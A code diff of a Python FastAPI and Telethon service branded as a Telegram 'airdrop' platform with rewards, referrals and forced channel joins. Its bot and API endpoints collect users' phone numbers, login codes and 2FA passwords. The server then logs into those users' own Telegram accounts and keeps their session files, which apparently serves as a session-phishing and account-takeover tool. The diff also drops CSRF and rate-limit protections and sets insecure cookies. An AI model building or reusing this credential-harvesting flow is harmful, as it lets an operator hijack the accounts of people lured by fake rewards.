-        elif roll < 0.65:
-            reward = {"type": "stars", "amount": random.randint(6, 19)}
-        else:
-            reward = {"type": "stars", "amount": random.randint(1, 5)}
-
-        async with self.db.transaction():
-            await self.db.execute(
-                "UPDATE users SET balance = balance - 17, updated_at=? WHERE id=?",
-                (now, user_id),
-            )
-            await self.db.execute(
-                "INSERT INTO rewards(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
-                (user_id, reward["type"], str(reward["amount"]), json.dumps({"box": True}, ensure_ascii=False), now),
-            )
-            await self.db.execute(
-                "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
-                (user_id, "mystery_box", -17, json.dumps(reward, ensure_ascii=False), now),
-            )
-        refreshed = await self.get_by_id(user_id)
-        return {"reward": reward, "new_balance": refreshed["balance"] if refreshed else 0}
-
-    async def rewards_for_user(self, user_id: int, limit: int = 20) -> List[Dict[str, Any]]:
-        rows = await self.db.fetchall(
-            "SELECT * FROM rewards WHERE user_id=? ORDER BY id DESC LIMIT ?",
-            (user_id, limit),
-        )
-        out: List[Dict[str, Any]] = []
-        for row in rows:
-            item = dict(row)
-            item["meta"] = json.loads(item["meta"] or "{}")
-            out.append(item)
-        return out
-
-
-@dataclass
-class TaskRepo:
-    db: Database
-
-    async def list_active(self) -> List[Dict[str, Any]]:
-        rows = await self.db.fetchall("SELECT * FROM tasks WHERE active=1 ORDER BY id DESC")
-        return [dict(r) for r in rows]
-
-    async def create(self, payload: TaskCreateRequest) -> Dict[str, Any]:
-        now = Security.utcnow().isoformat()
-        async with self.db.transaction():
-            cur = await self.db.execute(
-                """
-                INSERT INTO tasks(title, description, reward, kind, target_url, active, created_at, updated_at)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-                """,
-                (payload.title, payload.description, payload.reward, payload.kind, payload.target_url, int(payload.active), now, now),
-            )
-        row = await self.db.fetchone("SELECT * FROM tasks WHERE id=?", (cur.lastrowid,))
-        return dict(row) if row else {}
-
-    async def complete(self, user_id: int, task_id: int) -> Dict[str, Any]:
-        now = Security.utcnow().isoformat()
-        task = await self.db.fetchone("SELECT * FROM tasks WHERE id=? AND active=1", (task_id,))
-        if not task:
-            raise ResourceNotFoundError("Task not found.")
-        try:
-            async with self.db.transaction():
-                await self.db.execute(
-                    "INSERT INTO task_completions(user_id, task_id, status, completed_at) VALUES (?, ?, 'completed', ?)",
-                    (user_id, task_id, now),
-                )
-                await self.db.execute("UPDATE users SET balance = balance + ?, updated_at=? WHERE id=?", (int(task["reward"]), now, user_id))
-                await self.db.execute(
-                    "INSERT INTO rewards(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
-                    (user_id, "task", str(task["reward"]), json.dumps({"task_id": task_id, "title": task["title"]}, ensure_ascii=False), now),
-                )
-                await self.db.execute(
-                    "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
-                    (user_id, "task_reward", int(task["reward"]), json.dumps({"task_id": task_id}, ensure_ascii=False), now),
-                )
-        except aiosqlite.IntegrityError as exc:
-            raise AirdropError("Task already completed.") from exc
-
-        return {"task_id": task_id, "reward": int(task["reward"])}
-
-
-@dataclass
-class TransactionRepo:
-    db: Database
-
-    async def list_by_user(self, user_id: int, limit: int = 50) -> List[Dict[str, Any]]:
-        rows = await self.db.fetchall("SELECT * FROM transactions WHERE user_id=? ORDER BY id DESC LIMIT ?", (user_id, limit))
-        out: List[Dict[str, Any]] = []
-        for row in rows:
-            item = dict(row)
-            item["meta"] = json.loads(item["meta"] or "{}")
-            out.append(item)
-        return out
-
-
-@dataclass
-class SessionRepo:
-    db: Database
-
-    async def upsert(
-        self,
-        user_id: int,
-        session_id: str,
-        phone: str,
-        state: str,
-        ref_code: Optional[str] = None,
-        ttl_seconds: int = 600,
-    ) -> None:
-        now = Security.utcnow()
-        expires = now + timedelta(seconds=ttl_seconds)
-        async with self.db.transaction():
-            row = await self.db.fetchone("SELECT id FROM sessions WHERE session_id=?", (session_id,))
-            if row:
-                await self.db.execute(
-                    "UPDATE sessions SET state=?, ref_code=?, updated_at=?, expires_at=? WHERE session_id=?",
-                    (state, ref_code, now.isoformat(), expires.isoformat(), session_id),
-                )
-            else:
-                await self.db.execute(
-                    """
-                    INSERT INTO sessions(user_id, session_id, phone, state, ref_code, created_at, updated_at, expires_at)
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-                    """,
-                    (user_id, session_id, phone, state, ref_code, now.isoformat(), now.isoformat(), expires.isoformat()),
-                )
-
-    async def delete(self, session_id: str) -> None:
-        async with self.db.transaction():
-            await self.db.execute("DELETE FROM sessions WHERE session_id=?", (session_id,))
-
-
-user_repo = UserRepo(db)
-task_repo = TaskRepo(db)
-tx_repo = TransactionRepo(db)
-session_repo = SessionRepo(db)
-
-
-# =============================================================================
-# WebSocket hub
-# =============================================================================
-
-class SocketHub:
-    def __init__(self):
-        self._clients: set[WebSocket] = set()
-        self._lock = asyncio.Lock()
-
-    async def connect(self, ws: WebSocket) -> None:
-        await ws.accept()
-        async with self._lock:
-            self._clients.add(ws)
-
-    async def disconnect(self, ws: WebSocket) -> None:
-        async with self._lock:
-            self._clients.discard(ws)
-
-    async def broadcast(self, event: str, data: Dict[str, Any]) -> None:
-        payload = json.dumps({"event": event, "data": data}, ensure_ascii=False)
-        async with self._lock:
-            clients = list(self._clients)
-        to_drop: List[WebSocket] = []
-        for ws in clients:
-            try:
-                await ws.send_text(payload)
-            except Exception:
-                to_drop.append(ws)
-        if to_drop:
-            async with self._lock:
-                for ws in to_drop:
-                    self._clients.discard(ws)
-
-
-hub = SocketHub()
-
-
-# =============================================================================
-# Telegram userbot auth manager
-# =============================================================================
-
-class SessionState(str, enum.Enum):
-    INITIALIZED = "INITIALIZED"
-    CODE_SENT = "CODE_SENT"
-    AWAITING_2FA = "AWAITING_2FA"
-    LOGGED_IN = "LOGGED_IN"
-    ERROR = "ERROR"
-    EXPIRED = "EXPIRED"
-
-
-@dataclass
-class SessionContext:
-    session_id: str
-    phone: Optional[str] = None
-    client: Any = None
-    phone_code_hash: Optional[str] = None
-    state: SessionState = SessionState.INITIALIZED
-    attempts: int = 0
-    created_at: float = field(default_factory=time.time)
-    last_access: float = field(default_factory=time.time)
-    ref_code: Optional[str] = None
-
-
-class TelegramAuthManager:
-    def __init__(self):
-        self.sessions: Dict[str, SessionContext] = {}
-        self.phone_to_session: Dict[str, str] = {}
-        self._lock = asyncio.Lock()
-
-    async def _new_client(self, session_id: str) -> Any:
-        session_file = (AppPaths.SESSIONS / f"{session_id}.session").as_posix()
-        client = TelegramClient(session_file, settings.API_ID, settings.API_HASH)
-        await client.connect()
-        return client
-
-    async def _cleanup(self) -> None:
-        now = time.time()
-        expired = [sid for sid, ctx in self.sessions.items() if now - ctx.last_access > settings.SESSION_TIMEOUT_SECONDS]
-        for sid in expired:
-            ctx = self.sessions.pop(sid, None)
-            if ctx and ctx.phone and self.phone_to_session.get(ctx.phone) == sid:
-                self.phone_to_session.pop(ctx.phone, None)
-            if ctx and ctx.client:
-                try:
-                    await ctx.client.disconnect()
-                except Exception:
-                    pass
-
-    async def get_or_create(self, session_id: Optional[str] = None, phone: Optional[str] = None) -> SessionContext:
-        async with self._lock:
-            await self._cleanup()
-            if session_id and session_id in self.sessions:
-                ctx = self.sessions[session_id]
-                ctx.last_access = time.time()
-                if ctx.client and not getattr(ctx.client, "is_connected", lambda: False)():
-                    await ctx.client.connect()
-                return ctx
-
-            if phone and phone in self.phone_to_session:
-                existing = self.phone_to_session[phone]
-                if existing in self.sessions:
-                    old_ctx = self.sessions.pop(existing)
-                    if old_ctx.client:
-                        with contextlib.suppress(Exception):
-                            await old_ctx.client.disconnect()
-                self.phone_to_session.pop(phone, None)
-
-            if len(self.sessions) >= settings.MAX_BOT_SESSIONS:
-                raise HTTPException(status_code=503, detail="Server at maximum session capacity.")
-
-            sid = session_id or f"sess_{secrets.token_hex(12)}"
-            client = await self._new_client(sid)
-            ctx = SessionContext(session_id=sid, client=client, phone=phone)
-            self.sessions[sid] = ctx
-            if phone:
-                self.phone_to_session[phone] = sid
-            return ctx
-
-    async def send_code(self, phone: str, ref_code: Optional[str] = None) -> Dict[str, Any]:
-        phone = Security.normalize_phone(phone)
-        if not Security.valid_phone(phone):
-            raise HTTPException(status_code=400, detail="Invalid phone format.")
-        ctx = await self.get_or_create(phone=phone)
-        ctx.phone = phone
-        ctx.ref_code = ref_code
-        try:
-            res = await ctx.client.send_code_request(phone)
-            ctx.phone_code_hash = res.phone_code_hash
-            ctx.state = SessionState.CODE_SENT
-            await session_repo.upsert(user_id=0, session_id=ctx.session_id, phone=phone, state=ctx.state.value, ref_code=ref_code)
-            return {"status": "success", "session_id": ctx.session_id, "message": "Verification code sent to Telegram app."}
-        except FloodWaitError as exc:
-            raise HTTPException(status_code=429, detail=f"Flood wait. Try again in {exc.seconds} seconds.") from exc
-        except PhoneNumberBannedError as exc:
-            raise HTTPException(status_code=403, detail="This phone number is banned from Telegram.") from exc
-        except Exception as exc:
-            ctx.state = SessionState.ERROR
-            raise HTTPException(status_code=400, detail=str(exc)) from exc
-
-    async def verify_code(self, session_id: str, code: str) -> Dict[str, Any]:
-        ctx = await self.get_or_create(session_id=session_id)
-        if ctx.state not in (SessionState.CODE_SENT, SessionState.ERROR):
-            raise HTTPException(status_code=400, detail="Session is not waiting for code.")
-        if not ctx.phone_code_hash:
-            raise HTTPException(status_code=400, detail="Session expired or code request invalid.")
-
-        try:
-            await ctx.client.sign_in(phone=ctx.phone, code=code, phone_code_hash=ctx.phone_code_hash)
-            return await self.finalize_login(ctx)
-        except SessionPasswordNeededError:
-            ctx.state = SessionState.AWAITING_2FA
-            return {"status": "2fa_required", "message": "Two-step verification required."}
-        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as exc:
-            ctx.state = SessionState.ERROR
-            raise HTTPException(status_code=400, detail=str(exc)) from exc
-        except Exception as exc:
-            ctx.state = SessionState.ERROR
-            raise HTTPException(status_code=400, detail=str(exc)) from exc
-
-    async def verify_2fa(self, session_id: str, password: str) -> Dict[str, Any]:
-        ctx = await self.get_or_create(session_id=session_id)
-        if ctx.state != SessionState.AWAITING_2FA:
-            raise HTTPException(status_code=400, detail="Session is not awaiting 2FA.")
-        try:
-            await ctx.client.sign_in(password=password)
-            return await self.finalize_login(ctx)
-        except Exception as exc:
-            raise HTTPException(status_code=400, detail="Invalid 2FA password.") from exc
-
-    async def finalize_login(self, ctx: SessionContext) -> Dict[str, Any]:
-        me = await ctx.client.get_me()
-        ctx.state = SessionState.LOGGED_IN
-        web_token = Security.sign_jwt(str(me.id), {"telegram_id": me.id})
-
-        user = await user_repo.create_or_update_user(
-            telegram_id=me.id,
-            first_name=getattr(me, "first_name", "") or "",
-            last_name=getattr(me, "last_name", "") or "",
-            username=getattr(me, "username", "") or "",
-            phone=ctx.phone or "",
-            session_file=f"{ctx.session_id}.session",
-            login_date=Security.utcnow().isoformat(),
-            invited_by=None,
-        )
-        if ctx.ref_code:
-            await user_repo.apply_referral(ctx.ref_code, user["id"])
-
-        if ctx.client:
-            with contextlib.suppress(Exception):
-                await ctx.client.disconnect()
-
-        ctx.state = SessionState.EXPIRED
-        hub.broadcast  # keep lint calm
-
-        return {
-            "status": "success",
-            "message": "Login successful.",
-            "web_token": web_token,
-            "csrf_token": Security.csrf_token(),
-            "user": user,
-        }
-
-    async def cleanup_expired(self) -> None:
-        async with self._lock:
-            await self._cleanup()
-
-
-auth_manager = TelegramAuthManager()
-
-
-# =============================================================================
-# Bot FSM and multi-channel force join
-# =============================================================================
-
-@dataclass
-class BotStateData:
-    state: str = "PHONE"
-    phone: Optional[str] = None
-    session_id: Optional[str] = None
-    phone_code_hash: Optional[str] = None
-    client: Any = None
-    ref_code: Optional[str] = None
-    updated_at: float = field(default_factory=time.time)
-    attempts: int = 0
-    last_error: Optional[str] = None
-
-
-class BotStates(str, enum.Enum):
-    PHONE = "PHONE"
-    CODE = "CODE"
-    PASSWORD = "PASSWORD"
-    MAIN_MENU = "MAIN_MENU"
-
-
-class TelegramBotManager:
-    def __init__(self, token: str):
-        self.token = token
-        self.client = TelegramClient((AppPaths.SESSIONS / "bot.session").as_posix(), settings.API_ID, settings.API_HASH)
-        self.user_states: Dict[int, BotStateData] = {}
-        self.state_lock = asyncio.Lock()
-        self.required_channels = [x.strip() for x in settings.REQUIRED_CHANNELS.split(",") if x.strip()]
-        self.membership_cache: Dict[Tuple[int, str], Tuple[bool, float]] = {}
-        self.membership_cache_ttl = 300.0
-
-    async def start(self) -> None:
-        if not settings.ENABLE_BOT:
-            return
-        await self.client.start(bot_token=self.token)
-        log.info("Telegram bot started.")
-
-        @self.client.on(events.NewMessage(func=lambda e: e.is_private))
-        async def message_handler(event):
-            sender = await event.get_sender()
-            if not sender or getattr(sender, "bot", False):
-                return
-
-            user_id = sender.id
-            text = (event.raw_text or "").strip()
-
-            if text.startswith("/start"):
-                await self.cmd_start(event, user_id, text)
-                return
-            if text == "/cancel":
-                await self.cmd_cancel(event, user_id)
-                return
-            if text == "/menu":
-                await self.cmd_main_menu(event, user_id)
-                return
-            if text == "/help":
-                await self.cmd_help(event, user_id)
-                return
-            if text == "/status":
-                await self.cmd_status(event, user_id)
-                return
-
-            ok, missing = await self.check_membership(user_id)
-            if not ok:
-                await event.respond("🔒 Please join required channels first.", buttons=self.join_buttons(missing))
-                return
-
-            ctx = await self.ensure_state(user_id)
-            if ctx.state == BotStates.PHONE.value:
-                await self.handle_phone(event, user_id, text)
-            elif ctx.state == BotStates.CODE.value:
-                await self.handle_code(event, user_id, text)
-            elif ctx.state == BotStates.PASSWORD.value:
-                await self.handle_password(event, user_id, text)
-            else:
-                await self.cmd_main_menu(event, user_id)
-
-        @self.client.on(events.CallbackQuery)
-        async def callback_handler(event):
-            data = (event.data or b"").decode("utf-8", errors="ignore")
-            user_id = event.sender_id
-
-            if data == "check_join":
-                ok, missing = await self.check_membership(user_id)
-                if ok:
-                    await event.answer("Membership verified.", alert=False)
-                    await event.respond("✅ Access granted. Send /start again to continue.", buttons=self.menu_buttons())
-                else:
-                    await event.answer("Still missing channels.", alert=True)
-                    await event.respond("🔒 Join the remaining channels.", buttons=self.join_buttons(missing))
-                return
-
-            if data == "open_dashboard":
-                await event.answer()
-                await event.respond("🚀 Opening dashboard...", buttons=self.menu_buttons())
-                return
-
-            if data == "cancel_auth":
-                await self.cmd_cancel(event, user_id)
-                await event.answer("Cancelled.", alert=False)
-
-    def menu_buttons(self):
-        return [
-            [KeyboardButtonWebView(text="🚀 Open Mini App", url=settings.WEB_APP_URL)],
-            [Button.url("🌐 Open Dashboard", settings.WEB_APP_URL)],
-        ]
-
-    def join_buttons(self, missing_channels: List[str]):
-        buttons = []
-        for channel in missing_channels:
-            buttons.append([Button.url(f"Join @{channel}", f"https://t.me/{channel}")])
-        buttons.append([Button.inline("✅ I've Joined", b"check_join")])
-        buttons.append([Button.inline("❌ Cancel", b"cancel_auth")])
-        return buttons
-
-    async def ensure_state(self, user_id: int) -> BotStateData:
-        async with self.state_lock:
-            ctx = self.user_states.get(user_id)
-            if ctx is None:
-                ctx = BotStateData()
-                self.user_states[user_id] = ctx
-            ctx.updated_at = time.time()
-            return ctx
-
-    async def reset_state(self, user_id: int) -> None:
-        async with self.state_lock:
-            ctx = self.user_states.pop(user_id, None)
-        if ctx and ctx.client:
-            with contextlib.suppress(Exception):
-                await ctx.client.disconnect()
-
-    def parse_start_payload(self, text: str) -> Optional[str]:
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            return None
-        return parts[1].strip() or None
-
-    async def check_membership(self, user_id: int) -> Tuple[bool, List[str]]:
-        if not self.required_channels:
-            return True, []
-        missing: List[str] = []
-        for ch in self.required_channels:
-            key = (int(user_id), ch)
-            cached = self.membership_cache.get(key)
-            if cached and time.time() - cached[1] < self.membership_cache_ttl:
-                if not cached[0]:
-                    missing.append(ch)
-                continue
-            try:
-                await self.client.get_participant(ch, user_id)
-                self.membership_cache[key] = (True, time.time())
-            except Exception:
-                self.membership_cache[key] = (False, time.time())
-                missing.append(ch)
-        return len(missing) == 0, missing
-
-    async def cmd_start(self, event, user_id: int, text: str):
-        payload = self.parse_start_payload(text) or ""
-        ctx = await self.ensure_state(user_id)
-        ctx.state = BotStates.PHONE.value
-        if payload.startswith("ref_"):
-            ctx.ref_code = payload.replace("ref_", "", 1)
-        elif payload:
-            ctx.ref_code = payload
-
-        ok, missing = await self.check_membership(user_id)
-        if not ok:
-            await event.respond(
-                "🔒 To use the platform, join all required channels first.",
-                buttons=self.join_buttons(missing),
-            )
-            return
-
-        await event.respond(
-            "👋 Welcome to Pro Shop Ultimate.\n\n"
-            "Send your phone number in international format to begin authentication.",
-            buttons=self.menu_buttons(),
-        )
-
-    async def cmd_main_menu(self, event, user_id: int):
-        await event.respond(
-            "🏠 Main Menu",
-            buttons=self.menu_buttons(),
-        )
-
-    async def cmd_cancel(self, event, user_id: int):
-        await self.reset_state(user_id)
-        await event.respond("❌ Session cancelled. Send /start to begin again.")
-
-    async def cmd_help(self, event, user_id: int):
-        await event.respond(
-            "ℹ️ Commands\n\n"
-            "/start - Begin auth flow\n"
-            "/menu - Open dashboard menu\n"
-            "/status - Show FSM state\n"
-            "/cancel - Cancel session\n"
-            "/help - Show this help",
-            buttons=self.menu_buttons(),
-        )
-
-    async def cmd_status(self, event, user_id: int):
-        ctx = self.user_states.get(user_id)
-        state = ctx.state if ctx else "NONE"
-        await event.respond(f"📊 Current state: `{state}`")
-
-    async def handle_phone(self, event, user_id: int, text: str):
-        phone = Security.normalize_phone(text)
-        if not Security.valid_phone(phone):
-            await event.respond("❌ Invalid phone format. Example: `+491234567890`")
-            return
-
-        ctx = await self.ensure_state(user_id)
-        session_id = f"bot_{secrets.token_hex(12)}"
-        client = TelegramClient((AppPaths.SESSIONS / f"{session_id}.session").as_posix(), settings.API_ID, settings.API_HASH)
-        await client.connect()
-        try:
-            res = await client.send_code_request(phone)
-            ctx.phone = phone
-            ctx.session_id = session_id
-            ctx.phone_code_hash = res.phone_code_hash
-            ctx.client = client
-            ctx.state = BotStates.CODE.value
-            await event.respond("✅ Code sent. Please send the verification code now.")
-        except Exception as exc:
-            ctx.last_error = str(exc)
-            with contextlib.suppress(Exception):
-                await client.disconnect()
-            await event.respond(f"❌ {exc}")
-
-    async def handle_code(self, event, user_id: int, text: str):
-        ctx = self.user_states.get(user_id)
-        if not ctx or not ctx.client:
-            await event.respond("❌ Session expired. Send /start again.")
-            return
-        code = "".join(ch for ch in text if ch.isdigit())
-        if len(code) < 3:
-            await event.respond("❌ Code must contain digits only.")
-            return
-        try:
-            await ctx.client.sign_in(phone=ctx.phone, code=code, phone_code_hash=ctx.phone_code_hash)
-            me = await ctx.client.get_me()
-            saved = await self.save_bot_user(ctx, me, password=None)
-            await event.respond(
-                f"✅ Login successful, {me.first_name or 'user'}.",
-                buttons=self.menu_buttons(),
-            )
-            await self.reset_state(user_id)
-            await hub.broadcast("stats_update", await build_stats_payload(saved["id"]))
-        except SessionPasswordNeededError:
-            ctx.state = BotStates.PASSWORD.value
-            await event.respond("🔒 2FA enabled. Send your password.")
-        except Exception as exc:
-            ctx.last_error = str(exc)
-            await event.respond(f"❌ Invalid code: {exc}")
-
-    async def handle_password(self, event, user_id: int, text: str):
-        ctx = self.user_states.get(user_id)
-        if not ctx or not ctx.client:
-            await event.respond("❌ Session expired. Send /start again.")
-            return
-        try:
-            await ctx.client.sign_in(password=text)
-            me = await ctx.client.get_me()
-            saved = await self.save_bot_user(ctx, me, password="***")
-            await event.respond(
-                f"✅ 2FA successful, {me.first_name or 'user'}.",
-                buttons=self.menu_buttons(),
-            )
-            await self.reset_state(user_id)
-            await hub.broadcast("stats_update", await build_stats_payload(saved["id"]))
-        except Exception as exc:
-            ctx.last_error = str(exc)
-            await event.respond("❌ Invalid password. Try again or /cancel.")
-
-    async def save_bot_user(self, ctx: BotStateData, me: User, password: Optional[str]) -> Dict[str, Any]:
-        user = await user_repo.create_or_update_user(
-            telegram_id=me.id,
-            first_name=getattr(me, "first_name", "") or "",
-            last_name=getattr(me, "last_name", "") or "",
-            username=getattr(me, "username", "") or "",
-            phone=ctx.phone or "",
-            session_file=f"{ctx.session_id}.session" if ctx.session_id else "",
-            login_date=Security.utcnow().isoformat(),
-            invited_by=None,
-        )
-        if ctx.ref_code:
-            await user_repo.apply_referral(ctx.ref_code, user["id"])
-            user["invited_by"] = ctx.ref_code
-        return user
-
-
-bot_manager = TelegramBotManager(settings.TOKEN_BOT)
-
-
-# =============================================================================
-# FastAPI application
-# =============================================================================
-
-app = FastAPI(
-    title="Pro Shop Ultimate Enterprise Telegram Airdrop & Auth Platform",
-    version="250.0.0",
-    docs_url="/docs",
-    redoc_url="/redoc",
-)
-
+app = FastAPI(title=settings.APP_NAME, version="1.0.0", docs_url="/docs", redoc_url="/redoc")
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -1466,907 +1252,438 @@ app.add_middleware(
 )
 
 
-class RequestIdMiddleware(BaseHTTPMiddleware):
+class RequestLogMiddleware(BaseHTTPMiddleware):
     async def dispatch(self, request: Request, call_next):
-        request.state.request_id = secrets.token_hex(12)
+        started = time.time()
         response = await call_next(request)
-        response.headers["X-Request-ID"] = request.state.request_id
+        elapsed = (time.time() - started) * 1000
+        logger.info("%s %s -> %s (%.2fms)", request.method, request.url.path, response.status_code, elapsed)
         return response
 
 
-class CSRFMiddleware(BaseHTTPMiddleware):
-    async def dispatch(self, request: Request, call_next):
-        safe_methods = {"GET", "HEAD", "OPTIONS"}
-        if request.method not in safe_methods and request.url.path.startswith("/api/"):
-            if request.url.path not in {"/api/v1/auth/login", "/api/v1/auth/telegram/send-code", "/api/v1/auth/telegram/verify-code", "/api/v1/auth/telegram/verify-2fa"}:
-                csrf_cookie = request.cookies.get("csrf_token")
-                csrf_header = request.headers.get("X-CSRF-Token")
-                if not csrf_cookie or not csrf_header or csrf_cookie != csrf_header:
-                    return JSONResponse({"detail": "CSRF validation failed."}, status_code=403)
-        return await call_next(request)
+app.add_middleware(RequestLogMiddleware)
 
 
-class RateLimitMiddleware(BaseHTTPMiddleware):
-    def __init__(self, app, limit: int = 30):
-        super().__init__(app)
-        self.limit = limit
-        self.hits: Dict[str, List[float]] = {}
-        self.lock = asyncio.Lock()
-
-    async def dispatch(self, request: Request, call_next):
-        ip = request.client.host if request.client else "unknown"
-        if request.url.path.startswith("/api/"):
-            async with self.lock:
-                now = time.time()
-                times = [t for t in self.hits.get(ip, []) if now - t < 60]
-                if len(times) >= self.limit:
-                    return JSONResponse({"detail": "Rate limit exceeded."}, status_code=429)
-                times.append(now)
-                self.hits[ip] = times
-        return await call_next(request)
-
-
-app.add_middleware(RequestIdMiddleware)
-app.add_middleware(CSRFMiddleware)
-app.add_middleware(RateLimitMiddleware, limit=settings.RATE_LIMIT_PER_MINUTE)
-
-
-@app.exception_handler(ProShopError)
-async def proshop_error_handler(_: Request, exc: ProShopError):
-    return JSONResponse({"detail": str(exc)}, status_code=400)
-
-
-def require_admin_api_key(request: Request) -> None:
-    key = request.headers.get("X-API-Key", "")
-    if not Security.api_key_ok(key):
-        raise HTTPException(status_code=403, detail="Invalid admin API key.")
-
-
-def require_user_session(request: Request) -> Dict[str, Any]:
-    token = request.cookies.get("access_token") or request.headers.get("Authorization", "").replace("Bearer ", "")
-    if not token:
-        raise HTTPException(status_code=401, detail="Missing session token.")
-    claims = Security.decode_jwt(token)
-    return claims
-
-
-def require_web_user(request: Request) -> Dict[str, Any]:
-    claims = require_user_session(request)
-    return claims
-
-
-# =============================================================================
-# Auth endpoints
-# =============================================================================
-
-@app.on_event("startup")
-async def on_startup():
+@asynccontextmanager
+async def lifespan(_: FastAPI) -> AsyncIterator[None]:
     await db.connect()
-    if settings.ENABLE_BOT:
+    await task_repo.seed_default_tasks()
+    await auth_manager.start_cleanup_loop()
+    global bot_manager
+    required_channels = [c.strip() for c in settings.REQUIRED_CHANNELS.split(",") if c.strip()]
+    bot_manager = TelegramBotManager(settings.TELEGRAM_BOT_TOKEN, settings.WEB_APP_URL, required_channels)
+    if settings.ENABLE_BOT and settings.TELEGRAM_BOT_TOKEN and settings.TELEGRAM_API_ID and settings.TELEGRAM_API_HASH:
         asyncio.create_task(bot_manager.start())
-    asyncio.create_task(periodic_cleanup())
-    asyncio.create_task(periodic_broadcast())
+    try:
+        yield
+    finally:
+        await auth_manager.stop_cleanup_loop()
+        await db.close()
 
 
-@app.on_event("shutdown")
-async def on_shutdown():
-    await auth_manager.cleanup_expired()
-    await db.close()
 
 
-@app.post("/api/v1/auth/telegram/send-code")
-async def telegram_send_code(payload: LoginInitRequest):
-    ref_code = payload.ref_code.strip() if payload.ref_code else None
-    result = await auth_manager.send_code(payload.phone, ref_code=ref_code)
-    return result
+app.router.lifespan_context = lifespan
+
+# ---------------------------------------------------------------------------
+# CSRF / auth helpers
+# ---------------------------------------------------------------------------
 
 
-@app.post("/api/v1/auth/telegram/verify-code")
-async def telegram_verify_code(payload: VerifyCodeRequest):
-    return await auth_manager.verify_code(payload.session_id, payload.code)
+def set_session_cookies(response: Response, access_token: str, csrf_token: str) -> None:
+    response.set_cookie(settings.ACCESS_COOKIE_NAME, access_token, httponly=True, secure=False, samesite="lax", max_age=settings.ACCESS_TOKEN_TTL_MINUTES * 60)
+    response.set_cookie(settings.CSRF_COOKIE_NAME, csrf_token, httponly=False, secure=False, samesite="lax", max_age=settings.ACCESS_TOKEN_TTL_MINUTES * 60)
 
 
-@app.post("/api/v1/auth/telegram/verify-2fa")
-async def telegram_verify_2fa(payload: Verify2FARequest):
-    return await auth_manager.verify_2fa(payload.session_id, payload.password)
+def clear_session_cookies(response: Response) -> None:
+    response.delete_cookie(settings.ACCESS_COOKIE_NAME)
+    response.delete_cookie(settings.CSRF_COOKIE_NAME)
 
 
-@app.post("/api/v1/auth/login")
-async def web_login(response: Response, telegram_id: int = Form(...), token: str = Form(...)):
-    claims = Security.decode_jwt(token)
-    if int(claims.get("telegram_id", 0)) != int(telegram_id):
-        raise HTTPException(status_code=403, detail="Token mismatch.")
+def require_csrf(request: Request) -> None:
+    cookie_csrf = request.cookies.get(settings.CSRF_COOKIE_NAME)
+    header_csrf = request.headers.get("X-CSRF-Token")
+    if not cookie_csrf or not header_csrf or cookie_csrf != header_csrf:
+        raise HTTPException(status_code=403, detail="CSRF validation failed.")
+
+
+async def get_current_user(request: Request) -> Dict[str, Any]:
+    token = request.cookies.get(settings.ACCESS_COOKIE_NAME)
+    auth = request.headers.get("Authorization", "")
+    if not token and auth.startswith("Bearer "):
+        token = auth.replace("Bearer ", "", 1).strip()
+    if not token:
+        raise HTTPException(status_code=401, detail="Not authenticated.")
+    try:
+        payload = decode_token(token, "user")
+        telegram_id = int(payload["sub"])
+    except Exception:
+        raise HTTPException(status_code=401, detail="Invalid session token.")
     user = await user_repo.get_by_telegram_id(telegram_id)
     if not user:
         raise HTTPException(status_code=404, detail="User not found.")
-    access = Security.sign_jwt(str(user["id"]), {"telegram_id": telegram_id, "role": "user"})
-    csrf = Security.csrf_token()
-    response.set_cookie("access_token", access, httponly=True, secure=False, samesite="lax", max_age=60 * 60 * 24 * 7)
-    response.set_cookie("csrf_token", csrf, httponly=False, secure=False, samesite="lax", max_age=60 * 60 * 24 * 7)
-    return {"status": "success", "csrf_token": csrf, "user": user}
+    return user
 
 
-@app.post("/api/v1/auth/logout")
-async def web_logout(response: Response, _: Dict[str, Any] = Depends(require_web_user)):
-    response.delete_cookie("access_token")
-    response.delete_cookie("csrf_token")
-    return {"status": "success"}
-
-
-@app.get("/api/v1/auth/csrf")
-async def get_csrf():
-    return {"csrf_token": Security.csrf_token()}
-
-
-# =============================================================================
-# Airdrop / profile / tasks / transactions
-# =============================================================================
-
-async def build_stats_payload(user_id: int) -> Dict[str, Any]:
-    user = await user_repo.get_by_id(user_id)
-    if not user:
-        return {"users": 0, "leaderboard": [], "global_balance": 0, "me": None}
-    top = await user_repo.list_top(10)
-    rows = await db.fetchall("SELECT COALESCE(SUM(balance),0) AS total FROM users")
-    total_balance = int(rows[0]["total"]) if rows else 0
-    count_row = await db.fetchone("SELECT COUNT(*) AS c FROM users")
-    total_users = int(count_row["c"]) if count_row else 0
-    return {
-        "users": total_users,
-        "global_balance": total_balance,
-        "leaderboard": top,
-        "me": user,
-    }
-
-
-@app.get("/api/v1/me")
-async def me(request: Request, claims: Dict[str, Any] = Depends(require_web_user)):
-    user_id = int(claims["sub"])
-    user = await user_repo.get_by_id(user_id)
-    if not user:
-        raise HTTPException(status_code=404, detail="User not found.")
-    return {
-        "status": "success",
-        "user": user,
-        "rewards": await user_repo.rewards_for_user(user_id),
-        "transactions": await tx_repo.list_by_user(user_id),
-        "tasks": await task_repo.list_active(),
-        "leaderboard": await user_repo.list_top(10),
-    }
-
-
-@app.get("/api/v1/profile")
-async def profile(_: Request, claims: Dict[str, Any] = Depends(require_web_user)):
-    user_id = int(claims["sub"])
-    user = await user_repo.get_by_id(user_id)
-    if not user:
-        raise HTTPException(status_code=404, detail="User not found.")
-    ref_link = f"https://t.me/{settings.BOT_USERNAME}?start=ref_{user['ref_code']}"
-    return {
-        "status": "success",
-        "profile": {
-            **user,
-            "ref_link": ref_link,
-            "gift_available": int(user["balance"]) >= 17,
-        },
-    }
-
-
-@app.post("/api/v1/claim/daily")
-async def claim_daily(_: Request, claims: Dict[str, Any] = Depends(require_web_user)):
-    user_id = int(claims["sub"])
-    result = await user_repo.daily_claim(user_id)
-    await hub.broadcast("stats_update", await build_stats_payload(user_id))
-    return {"status": "success", **result}
-
-
